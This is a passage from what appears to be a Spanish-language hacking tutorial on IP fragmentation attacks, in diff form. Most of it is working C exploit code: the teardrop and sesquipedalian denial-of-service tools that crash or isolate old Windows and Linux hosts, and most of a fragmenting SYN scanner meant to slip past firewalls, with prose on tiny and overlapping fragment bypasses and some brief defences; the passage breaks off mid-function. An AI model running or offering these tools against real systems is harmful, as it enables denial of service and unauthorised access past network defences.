+#ifdef STRANGE_BSD_BYTE_ORDERING_THING
+                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */
+#define FIX(n)  (n)
+#else                   /* OpenBSD 2.1, all Linux */
+#define FIX(n)  htons(n)
+#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */
+
+#define IP_MF   0x2000  /* More IP fragment en route */
+#define IPH     0x14    /* IP header size */
+#define UDPH    0x8     /* UDP header size */
+#define PADDING 0x1c    /* datagram frame padding for first packet */
+#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */
+#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
+                         * withstand maybe 5 or 10 sometimes...  Experiment.
+                         */
+void usage(u_char *);
+u_long name_resolve(u_char *);
+u_short in_cksum(u_short *, int);
+void send_frags(int, u_long, u_long, u_short, u_short);
+
+int main(int argc, char **argv)
+{
+    int one = 1, count = 0, i, rip_sock;
+    u_long  src_ip = 0, dst_ip = 0;
+    u_short src_prt = 0, dst_prt = 0;
+    struct in_addr addr;
+
+    fprintf(stderr, "teardrop   route|daemon9\n\n");
+
+    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+        perror("raw socket");
+        exit(1);
+    }
+    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))
+        < 0)
+    {
+        perror("IP_HDRINCL");
+        exit(1);
+    }
+    if (argc < 3) usage(argv[0]);
+    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))
+    {
+        fprintf(stderr, "What the hell kind of IP address is that?\n");
+        exit(1);
+    }
+
+    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
+    {
+        switch (i)
+        {
+            case 's':               /* source port (should be emphemeral) */
+                src_prt = (u_short)atoi(optarg);
+                break;
+            case 't':               /* dest port (DNS, anyone?) */
+                dst_prt = (u_short)atoi(optarg);
+                break;
+            case 'n':               /* number to send */
+                count   = atoi(optarg);
+                break;
+            default :
+                usage(argv[0]);
+                break;              /* NOTREACHED */
+        }
+    }
+    srandom((unsigned)(time((time_t)0)));
+    if (!src_prt) src_prt = (random() % 0xffff);
+    if (!dst_prt) dst_prt = (random() % 0xffff);
+    if (!count)   count   = COUNT;
+
+    fprintf(stderr, "Death on flaxen wings:\n");
+    addr.s_addr = src_ip;
+    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
+    addr.s_addr = dst_ip;
+    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
+    fprintf(stderr, " Amt: %5d\n", count);
+    fprintf(stderr, "[ ");
+
+    for (i = 0; i < count; i++)
+    {
+        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
+        fprintf(stderr, "b00m ");
+        usleep(500);
+    }
+    fprintf(stderr, "]\n");
+    return (0);
+}
+
+/*
+ *  Send two IP fragments with pathological offsets.  We use an implementation
+ *  independent way of assembling network packets that does not rely on any of
+ *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
+ */
+
+void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
+                u_short dst_prt)
+{
+    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
+    u_char byte;                            /* a byte */
+    struct sockaddr_in sin;                 /* socket protocol structure */
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = src_prt;
+    sin.sin_addr.s_addr = dst_ip;
+
+    /*
+     * Grab some memory for our packet, align p_ptr to point at the beginning
+     * of our packet, and then fill it with zeros.
+     */
+    packet = (u_char *)malloc(IPH + UDPH + PADDING);
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    /*  We set the fragment offset to be inside of the previous packet's
+     *  payload (it overlaps inside the previous packet) but do not include
+     *  enough payload to cover complete the datagram.  Just the header will
+     *  do, but to crash NT/95 machines, a bit larger of packet seems to work
+     *  better.
+     */
+    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */
+    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);
+    p_ptr += 4;                 /* IP offset is 6 bytes into the header */
+    *((u_short *)p_ptr) = FIX(MAGIC);
+
+    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+    free(packet);
+}
+
+u_long name_resolve(u_char *host_name)
+{
+    struct in_addr addr;
+    struct hostent *host_ent;
+
+    if ((addr.s_addr = inet_addr(host_name)) == -1)
+    {
+        if (!(host_ent = gethostbyname(host_name))) return (0);
+        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);
+    }
+    return (addr.s_addr);
+}
+
+void usage(u_char *name)
+{
+    fprintf(stderr,
+            "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\n",
+            name);
+    exit(0);
+}
+
+
+Sesquipedalian (¨?)
+--------------
+
+Este es un problema relativamente nuevo, por lo que es probable que aun
+funcione por ahi (asi que sed buenos, eh?). Afecta a los kernels de Linux
+comprendidos entre el 2.1.89 y el 2.2.3, en el 2.2.4 ya esta resuelto.
+
+De lo que se trata es de meter fragmentos con offset 0 y tama¤o 0 en la lista
+de conexiones que el host esta procesando en ese momento. Con esto se
+consigue que el kernel no libere esas entradas en la cache de conexiones.
+Una vez que la cache este llena (tiene 4096 entradas al menos), las
+comunicaciones IP del host no podran mantenerse correctamente y se le aislara.
+
+Este es el codigo:
+
+/*
+ * sesquipedalian.c - Demonstrates a DoS bug in Linux 2.1.89 - 2.2.3
+ *
+ * by horizon <jmcdonal@unf.edu>
+ *
+ * This sends a series of IP fragments such that a 0 length fragment is first
+ * in the fragment list. This causes a reference count on the cached routing
+ * information for that packet's originator to be incremented one extra time.
+ * This makes it impossible for the kernel to deallocate the destination entry
+ * and remove it from the cache.
+ *
+ * If we send enough fragments such that there are at least 4096 stranded
+ * dst cache entries, then the target machine will no longer be able to
+ * allocate new cache entries, and IP communication will be effectively
+ * disabled. You will need to set the delay such that packets are not being
+ * dropped, and you will probably need to let the program run for a few
+ * minutes to have the full effect. This was written for OpenBSD and Linux.
+ *
+ * Thanks to vacuum, colonwq, duke, rclocal, sygma, and antilove for testing.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+
+struct my_ip_header
+{
+	unsigned char  ip_hl:4,         /* header length */
+		ip_v:4;               /* version */
+	unsigned char  ip_tos;          /* type of service */
+	unsigned short ip_len;          /* total length */
+	unsigned short ip_id;           /* identification */
+	unsigned short ip_off;          /* fragment offset field */
+#define IP_RF 0x8000                    /* reserved fragment flag */
+#define IP_DF 0x4000                    /* dont fragment flag */
+#define IP_MF 0x2000                    /* more fragments flag */
+#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
+	unsigned char  ip_ttl;          /* time to live */
+	unsigned char  ip_p;                    /* protocol */
+	unsigned short ip_sum;          /* checksum */
+	unsigned long ip_src, ip_dst; /* source and dest address */
+};
+
+struct my_udp_header
+{
+	unsigned short uh_sport;
+	unsigned short uh_dport;
+	unsigned short uh_ulen;
+	unsigned short uh_sum;
+};
+
+#define IHLEN (sizeof (struct my_ip_header))
+#define UHLEN (sizeof (struct my_udp_header))
+
+#ifdef __OpenBSD__
+#define EXTRA 8
+#else
+#define EXTRA 0
+#endif
+
+unsigned short checksum(unsigned short *data,unsigned short length)
+{
+        register long value;
+        u_short i;
+
+        for(i=0;i<(length>>1);i++)
+                value+=data[i];
+
+        if((length&1)==1)
+                value+=(data[i]<<8);
+
+        value=(value&65535)+(value>>16);
+
+        return(~value);
+}
+
+unsigned long resolve( char *hostname)
+{
+	long result;
+	struct hostent *hp;
+
+	if ((result=inet_addr(hostname))==-1)
+	{
+		if ((hp=gethostbyname(hostname))==0)
+		{
+			fprintf(stderr,"Can't resolve target.\n");
+			exit(1);
+		}
+		bcopy(hp->h_addr,&result,4);
+	}
+	return result;
+}
+
+void usage(void)
+{
+	fprintf(stderr,"usage: ./sqpd [-s sport] [-d dport] [-n count] [-u delay] source target\n");
+	exit(0);
+}
+
+
+void sendem(int s, unsigned long source, unsigned long dest,
+		unsigned short sport, unsigned short dport)
+{
+	static char buffer[8192];
+	struct my_ip_header *ip;
+	struct my_udp_header *udp;
+	struct sockaddr_in sa;
+
+	bzero(&sa,sizeof(struct sockaddr_in));
+	sa.sin_family=AF_INET;
+	sa.sin_port=htons(sport);
+	sa.sin_addr.s_addr=dest;
+
+	bzero(buffer,IHLEN+32);
+	
+	ip=(struct my_ip_header *)buffer;
+	udp=(struct my_udp_header *)&(buffer[IHLEN]);
+
+	ip->ip_v = 4;
+	ip->ip_hl = IHLEN >>2;
+	ip->ip_tos = 0;
+	ip->ip_id = htons(random() & 0xFFFF);
+	ip->ip_ttl = 142;
+	ip->ip_p = IPPROTO_UDP;
+	ip->ip_src = source;
+	ip->ip_dst = dest;
+	udp->uh_sport = htons(sport);
+	udp->uh_dport = htons(dport);
+	udp->uh_ulen = htons(64-UHLEN);
+	udp->uh_sum = 0;
+
+	/* Our first fragment will have an offset of 0, and be 32 bytes
+	   long. This gets added as the only element in the fragment
+	   list. */
+
+	ip->ip_len = htons(IHLEN+32);
+	ip->ip_off = htons(IP_MF);
+	ip->ip_sum = 0;
+	ip->ip_sum = checksum((u_short *)buffer,IHLEN+32);
+
+	if (sendto(s,buffer,IHLEN+32,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+		exit(1);
+	}
+
+	/* Our second fragment will have an offset of 0, and a 0 length.
+	   This gets added to the list before our previous fragment,
+	   making it first in line. */
+
+	ip->ip_len = htons(IHLEN);
+	ip->ip_off = htons(IP_MF);
+	ip->ip_sum = 0;
+	ip->ip_sum = checksum((u_short *)buffer,IHLEN);
+
+	if (sendto(s,buffer,IHLEN+EXTRA,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+		exit(1);
+	}
+
+	/* Our third and final frag has an offset of 4 (32 bytes), and a
+	   length of 32 bytes. This passes our three frags up to ip_glue. */
+
+	ip->ip_len = htons(IHLEN+32);
+	ip->ip_off = htons(32/8);
+	ip->ip_sum = 0;
+	ip->ip_sum = checksum((u_short *)buffer,IHLEN+32);
+
+	if (sendto(s,buffer,IHLEN+32,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+		exit(1);
+	}
+}
+
+int main(int argc, char **argv)
+{
+	int sock;
+	int on=1,i;
+	unsigned long source, dest;
+	unsigned short sport=53, dport=16384;
+	int delay=20000, count=15000;
+
+	if (argc<3)
+		usage();	
+
+	while ((i=getopt(argc,argv,"s:d:n:u:"))!=-1)
+	{
+		switch (i)
+		{
+			case 's': sport=atoi(optarg);
+				  break;
+			case 'd': dport=atoi(optarg);
+				  break;
+			case 'n': count=atoi(optarg);
+				  break;
+			case 'u': delay=atoi(optarg);
+				  break;
+			default:  usage();
+		}
+	}
+	
+	argc-=optind;
+	argv+=optind;
+
+	source=resolve(argv[0]);
+        dest=resolve(argv[1]);
+
+	srandom(time((time_t)0)*getpid());
+
+	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+	{
+		perror("socket");
+		exit(1);
+	}
+
+	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0)
+	{
+		perror("setsockopt: IP_HDRINCL");
+		exit(1);
+	}
+
+	fprintf(stdout,"\nStarting attack on %s ...",argv[1]);
+
+	for (i=0; i<count; i++)
+	{
+		sendem(sock,source+htonl(i),dest,sport,dport);
+		if (!(i%2))
+			usleep(delay);
+		if (!(i%100))
+		{
+			if (!(i%2000))
+				fprintf(stdout,"\n");
+			fprintf(stdout,".");
+			fflush(stdout);
+		}
+	}
+
+	fprintf(stdout,"\nDone.\n");
+	exit(1);
+}
+
+Hasta aqui el DoS. Aunque hay muchos mas que surgieron despues del teardrop
+(teardrop modificado, bonk/boink, syndrop, etc) y puede que surjan otros...
+
+
+  4.2.- Bypass firewalls
+
+Como vimos antes, los firewalls observan los campos source y destination
+address de la cabecera IP, y los campos source y destination port de la
+cabecera TCP o UDP (segun el caso). Veamos la forma de un datagrama normal:
+
++--------------+-----------------------------+--------   ---+
+|  Cabecera IP |  Cabecera TCP o UDP u otros |  Datos ...   |
++--------------+-----------------------------+--------   ---+
+
+Sabemos que las direcciones origen y destino se encuentran al final de la
+cabecera IP (si no hay opciones), pero donde estan los puertos origen y
+destino? Veamos:
+
++-------------------------------- RFC793 ------------------------------------+
+
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |          Source Port          |       Destination Port        |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                        Sequence Number                        |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                    Acknowledgment Number                      |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |  Data |           |U|A|P|R|S|F|                               |
+   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
+   |       |           |G|K|H|T|N|N|                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |           Checksum            |         Urgent Pointer        |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                    Options                    |    Padding    |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                             data                              |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+                            TCP Header Format
+
++-------------------------------- RFC793 ------------------------------------+
+
++-------------------------------- RFC768 ------------------------------------+
+
+                  0      7 8     15 16    23 24    31
+                 +--------+--------+--------+--------+ 
+                 |     Source      |   Destination   | 
+                 |      Port       |      Port       | 
+                 +--------+--------+--------+--------+ 
+                 |                 |                 | 
+                 |     Length      |    Checksum     | 
+                 +--------+--------+--------+--------+ 
+                 |                                     
+                 |          data octets ...            
+                 +---------------- ...                 
+
+                      User Datagram Header Format
+
++-------------------------------- RFC768 ------------------------------------+
+
+Como ves los campos de los puertos estan al comienzo de la cabecera, siendo
+cada uno de ellos de 16 bits.
+
+Lo que debemos preguntarnos ahora es como reacciona un firewall cuando, en
+lugar de llegarle un datagrama completo, le llega fragmentado. Una primera
+solucion bastante logica es aplicar las restricciones al primer datagrama,
+aquel que tenga FO=0 (y MF=1 claro), ya que sera en ese en el que se
+encuentre la cabecera TCP o UDP. Aplicando al resto de fragmentos el resultado
+que se haya obtenido con el primero (dejarlo pasar o 'quemarlo'). Puede que
+algun fragmento llegue a la red por otro gateway, pero bastara con que se
+descarten (si es necesario) algunos para que el datagrama no se pueda
+reensamblar, y sea efectivamente filtrado.
+
+
+Tiny fragments
+--------------
+
+Este ataque se ha hecho bastante popular desde que Fyodor lo implemento en
+su escaneador nmap.
+
+Lo que se pretende aqui es mandar fragmentos lo suficientemente peque¤os como
+para que ciertas partes de la cabecera TCP (no se usa, en principio, con
+paquetes UDP) queden fuera del primer fragmento.
+
+El tama¤o minimo de datos que puede llevar un fragmento es de 8 bytes
+(RFC791); en ese fragmento entrarian los puertos origen y destino, pero
+quedarian fuera otros muchos campos de la cabecera. Cualquier restriccion que
+dependa de esos campos no podra ser chequeada y el paquete pasara.
+
+En el caso anterior (8 bytes de datos) quedarian "fuera" (para el segundo
+fragmento) los flags de la cabecera TCP, con lo que no se podran chequear los
+bits SYN y ACK para comprobar que se trata de un paquete de peticion de
+conexion, y, por lo tanto, podria dejarlo pasar (no siempre...). La forma de
+los fragmentos seria:
+
+fragmento1:
+           IHL = 5 (no hay opcciones)
+           MF = 1 (quedan mas fragmentos)
+           FO = 0 (es el primer fragmento)
+           TL = 28 (mandamos 28 - 20 = 8 bytes de datos)
+
+fragmento2:
+           IHL = 5
+           MF = 0 (o 1, depende)
+           FO = 1 (empezamos en el 8§ byte)
+           TL = depende (se pueden seguir mandando fragmentos peque¤os, o
+                         mandar el resto del paquete en este).
+
+Las formas de evitar este tipo de ataques son: o bien fijar un tama¤o minimo
+para el primer fragmento que fuerce la presencia en el de todos los campos
+significativos de la cabecrea; o bien descartar cualquier fragmento que
+tenga un FO = 1 (necesario para dejar fuera parte de la cabecera TCP). Al
+descartar un fragmento el datagrama no podra ser reensamblado y, por lo tanto,
+sera filtrado.
+
+[N. del A: El ejemplo anterior no es el unico posible, debe ser tomado
+unicamente como un ejemplo.]
+
+
+Solapamiento de fragmentos
+--------------------------
+
+Como ya vimos en el apartado de reensamblado de paquetes, el RFC791 especifica
+que los fragmentos pueden solaparse total o parcialmente, y que en esos casos
+los ultimos datos en llegar tienen preferencia y sobreescribiran a los que ya
+habia. Tambien dijimos que eso no siempre es asi...
+
+La forma en la que funciona este ataque es la siguiente: se manda un primer
+fragmento con datos en la cabecera que permitan pasar las restricciones de
+filtrado del firewall, y despues se manda otro que sobreescriba parte del
+anterior (puerto destino, flags, ...) para que se adapte a nuestras
+"necesidades".
+
+Se podria intentar un ataque similar al anterior, en el que el segundo
+fragmento sobreescriba los flags y permita hacer una peticion de conexion.
+Se haria de la siguiente forma:
+
+fragmento1:
+           MF = 1
+           FO = 0
+           TL = 200 (por ejemplo)
+           ACK = '1' (en la cabacera TCP claro)
+
+fragmento2:
+           MF = 0
+           FO = 1
+           TL = 192
+           ACK = '0' (con SYN = '1', peticion de conexion)
+
+El segundo fragmento, en principio, no seria chequeado ya que el primero ha
+pasado el "test", y sobreescribiria al anterior a la hora de reensamblar. En
+el caso de que la implementacion no de prioridad a los datos nuevos sobre los
+que ya habia, podriamos mandar primero el fragmento2 y despues el fragmento1
+y conseguiriamos lo mismo :).
+
+Otro posible ataque (con menos probabilidad de surtir efecto, aunque nunca se
+sabe lo actualizado que esta el firewall ;] ) seria intentar sobreescribir el
+puerto destino, para ello el segundo fragmento ha de tener tambien un FO = 0,
+con lo que solo funcionara si el chequeo se hace al primero, y solo al
+primero, de los fragmentos con FO = 0. Ademas el algoritmo de reensamblado
+debe dar prioridad a los ultimos datos en llegar, ya que no tenemos la
+posibilidad de mandar (como antes) el fragmento2 primero. La ventaja que tiene
+este metodo es que si el firewall es vulnerable y permite el libre acceso a
+un puerto (basta con un solo puerto), podemos pasarlo y acceder a cualquier
+otro que este abierto en el host. Por ejemplo:
+
+fragmento1:
+           MF = 1
+           FO = 0
+           TL = 200
+           DEST_PORT = 80 (suponiendo que permita acceso a su web. Tambien se
+                           suele usar el puerto 20 ftp-data, que normalmente
+                           permite conexiones. Valdria cualquiera que el
+                           firewall no filtrara.)
+
+fragmento2:
+           IHL = 5
+           MF = 1
+           FO = 0
+           TL = 20 (IHL) + "lo que se quiera sobreescribir"                                                de datos.)
+           DEST_PORT = 23 (por ejemplo; en realidad podriamos poner
+                           cualquiera.)
+
+Faltaria un tercer fragmento que completase el datagrama, y si todo va bien ya
+tendriamos acceso telnet.
+
+Para evitar este ataque bastaria aplicar la segunda opcion de las dichas en el
+caso anterior, descartar cualquier fragmento con FO = 1 y que chequee todos y
+cada uno de los que tengan FO = 0. Para los casos en que se esten
+transportando otros protocolos, los datos de la cabecera que sean
+significativos podrian estar mas adelante, por lo que cada caso debe ser
+"estudiado".
+
+El caso que he implementado en este escaneador de puertos es el de
+sobreescribir el puerto destino. No existen muchas posibilidades de que sea
+efectivo en la practica, pero bastara como ejemplo de implementacion de este
+tipo de ataques. Os tendreis que buscar la vida en vuestro caso concreto. En
+caso de que rule bien os dara la lista de puertos abiertos *detras* del
+firewall; para acceder a ellos tendras que hacer un programa similar a este
+que sobreescriba el puerto destino en el SYN y luego continue la negociacion
+de la conexion de forma normal (cosa que un SYN-scanner obviamente NO HACE ;])
+
+
+/*
+ * Frag_Scan v0.1
+ * By Lykeios (lykeios@bigfoot.com)
+ * http://www.bigfoot.com/~lykeios
+ * 
+ * 04/05/1999
+ *
+ * Tipico SYN-scanner al que le he a¤adido la posibilidad de enviar el SYN en
+ * tres fragmentos para sobreescribir el puerto destino. Aunque tiene el 
+ * potencial de traspasar firewalls, no es muy probable que funcione muy a
+ * menudo en la actualidad. Mi unica intencion es exponer un ejemplo de la
+ * forma en la que se implementan este tipo de ataques. Modificarlo para que
+ * soporte otros es bastante sencillo.
+ *	
+ * CREDITS : Lo unico que yo he hecho a sido modificar ligeramente el conocido
+ *	   SYN-scanner de Halflife para que soporte "un tipo" de ataque basado 
+ *	   en fragmentacion, por lo que TODOS los creditos van para el.
+ *	  
+ *	   Por mi parte puedes modificar este codigo en todo o en parte si lo
+ *         consideras necesario. No necesitas mi permiso para nada.
+ *
+ * DISCLAIMER : Como dicen los yankis: This program comes as is, no warranty.
+ *              Asi que ya sabes...
+ *
+ * 		Hackea con moderacion. Es TU responsabilidad.
+ * 
+ */
+
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define MY_IP "127.0.0.1"
+
+void ayuda(char *);
+int scan(unsigned short, unsigned int, unsigned int, int);
+unsigned short cksum(unsigned short *, int);
+void alarma(int);
+
+extern char *optarg;
+extern int optind;
+
+int timeout = 0;
+
+void alarma(int s)
+{
+   alarm(0);
+   timeout = 1;
+}
+      
+
+int main(int argc, char *argv[])
+{
+unsigned short lo_port = 1;
+unsigned short hi_port = 1024;
+unsigned short magic_port;
+int opt, tmp;
+int frag_flag = 0;
+unsigned short i;
+unsigned int target_addr;
+
+
+
+if (geteuid() != 0)
+{
+	printf("Necesitas ser root para usar este programa.\n");
+        exit(0);
+}
+
+if (argc < 2)
+{
+	ayuda(argv[0]);
+	exit(0);
+}
+
+while ( (opt = getopt(argc,argv,"f:l:h:") )!= EOF)
+{
+	switch(opt) 
+	{
+		case 'f': frag_flag++;
+			  magic_port = atoi(optarg);
+			  break;
+		case 'l': lo_port = atoi(optarg);
+			  break;
+		case 'h': hi_port = atoi(optarg);
+			  break;
+	} 
+}
+
+if (optind == argc)
+{
+	ayuda(argv[0]);
+	exit(1);
+}
+
+printf("Frag_Scan v0.1 ## by Lykeios (04/05/1999).\n");
+printf("\nEscaneando el host %s entre los puertos %d y %d.\n",argv[optind], \
+	lo_port, hi_port);
+if (frag_flag)
+   printf("Usando fragmentacion de IP. Puerto de entrada: %d\n",magic_port);
+
+for (i = lo_port; i <= hi_port; i++)
+{
+	if (!frag_flag)
+	  tmp = scan(i, inet_addr(MY_IP), inet_addr(argv[optind]), 0);
+	else 
+	  tmp = scan(i, inet_addr(MY_IP), inet_addr(argv[optind]), magic_port);
+	if (tmp == 1)
+		printf("Puerto %d abierto\n", i);
+}
+return;
+}
+
+void ayuda(char *name)
+{
+        printf("Frag_Scan v0.1 ## by Lykeios (04/05/1999) http://www.bigfoot.com/~lykeios.\n");
+	printf("\nSintaxis: %s [-f port] [-l puerto_inicio] [-h puerto_fin] host_IP\n",name);
+        printf("-f : Para usar fragmentacion. 'port' es el puerto de entrada ;]\n");
+	printf("-l : Fija el primer puerto.\n");
+        printf("-h : Fija el ultimo puerto.\n");
+	printf("Por defecto scanea del 1 al 1024.\n\n");
+	return;	
+}
+
+int scan(unsigned short port, unsigned int source_addr, \
+	 unsigned int target_addr, int frag)
+{
+struct tcphdr tcp_go;
+struct iphdr  iph;
+
+struct pseudo_hdr
+{
+	unsigned int source_address;
+        unsigned int dest_address;
+        unsigned char placeholder;
+        unsigned char protocol;
+        unsigned short tcp_length;
+        struct tcphdr tcp;
+}pseudo_hdr;
+
+int my_socket;
+
+struct packet
+{
+	struct iphdr ip;
+	struct tcphdr tcp;
+	unsigned char data[65495];
+}packet;
+
+struct packet_go
+{
+	struct iphdr ip;
+	struct tcphdr tcp;
+	unsigned char data[200];
+}packet_go;
+
+struct sockaddr_in sock_in;
+
+int opt, fragn, size;
+
+bzero((struct packet *) &packet, sizeof(packet));
+
+tcp_go.source = getpid();
+tcp_go.dest = htons(port);
+tcp_go.seq = getpid();
+tcp_go.ack_seq = 0;
+tcp_go.res1 = 0;
+tcp_go.doff = 5;
+tcp_go.res2 = 0;
+tcp_go.fin = 0;
+tcp_go.syn = 1;
+tcp_go.rst = 0;
+tcp_go.psh = 0;
+tcp_go.ack = 0;
+tcp_go.urg = 0;
+tcp_go.window = htons(512);
+tcp_go.check = 0;
+tcp_go.urg_ptr =  0;
+
+pseudo_hdr.source_address = source_addr;
+pseudo_hdr.dest_address = target_addr;
+pseudo_hdr.placeholder = 0;
+pseudo_hdr.protocol = IPPROTO_TCP;
+pseudo_hdr.tcp_length = htons(20);
+
+bcopy(&tcp_go, &pseudo_hdr.tcp, 20);
+tcp_go.check = cksum((unsigned short *)&pseudo_hdr, 32);
+
+sock_in.sin_family = AF_INET;
+sock_in.sin_port = htons(port);
+sock_in.sin_addr.s_addr = target_addr;
+
+signal(SIGALRM, alarma);
+my_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+if (my_socket < 0)
+{
+	printf("Error al abrir el socket.\n");
+	exit(1);
+}
+
+opt = O_NONBLOCK | fcntl(my_socket, F_GETFL); /* Para evitar que read() nos */
+fcntl(my_socket, F_SETFL, opt);          /* bloquee el scan indefinidamente */
+
+if (!frag)
+	if (sendto(my_socket, &tcp_go, sizeof(tcp_go), 0, \
+   	   (struct sockaddr*)&sock_in, sizeof(sock_in)) == -1)
+	{
+		printf("Error: Sendto.\n");
+		exit(2);
+	}
+else /* Usamos fragmentacion */
+{
+for (fragn = 1; fragn <= 3; fragn++) /* Mandamos 3 fragmentos */
+{	
+	bzero(&iph, sizeof(struct iphdr));
+	iph.version = 4;
+	iph.ihl = 5; /* No hay opciones */
+	iph.tos = 0;
+	iph.id = getpid();  /* El id sera el mismo para los tres fragmentos */
+	iph.ttl = 255;
+	iph.protocol = IPPROTO_TCP;
+	iph.check = 0;
+	iph.saddr = source_addr;
+	iph.daddr = target_addr;
+		
+	if (fragn == 1) 
+		tcp_go.dest = htons(frag);
+	else if (fragn == 2) 
+		tcp_go.dest =htons(port); /* Cambiamos el puerto... */
+	
+	if (fragn != 3) /* En los dos primeros... */
+	{
+		/* Hay que recomputar el checksum del tcphdr... */
+                tcp_go.check = 0;
+		bcopy(&tcp_go, &pseudo_hdr.tcp, 20);
+		tcp_go.check = cksum((unsigned short *)&pseudo_hdr, 32);
+		
+		iph.frag_off = 0x2000; /* MF == 1 && FO == 0 */
+		iph.tot_len = htons(108); /*iphdr +tcphdr +68 bytes de datos */
+		size = 108;
+	}
+	else  
+	{
+                iph.frag_off = 0x000b; /* MF == 0 && FO == 11 (byte 88) */
+		iph.tot_len = htons(152); /* iphdr + 132 bytes de datos */
+		size = 152;
+	}
+
+	bcopy(&iph, (char *)&packet_go.ip, 20);
+	if (fragn != 3) bcopy(&tcp_go, (char *)&packet_go.tcp, 20);
+	
+	if (sendto(my_socket, &packet_go, size, 0, \
+   	   (struct sockaddr*)&sock_in, sizeof(sock_in)) == -1)
+	{
+		printf("Error: Sendto.\n");
+		exit(2);
+	}
+}
+}
+
+timeout = 0;
+alarm(10);
+while(1)
+{
+	read(my_socket, (struct packet *)& packet, sizeof(packet));
+	if (timeout == 1)
+	{
+		close(my_socket);
+		timeout = 0;
+		return -1;
+	}
+	if (packet.tcp.dest == getpid())
+	{
+		alarm(0);
+		close(my_socket);
+		if (packet.tcp.rst == 1)
+			return 0;
+		else 
+			return 1;
+	}
+}
+}
+
+unsigned short cksum(unsigned short *ptr, int nbytes)
+{
+        register long           sum;            /* assumes long == 32 bits */
+        u_short                 oddbyte;
+        register u_short        answer;         /* assumes u_short == 16 bits */
+                        
+        /*
+         * Our algorithm is simple, using a 32-bit accumulator (sum),
+         * we add sequential 16-bit words to it, and at the end, fold back
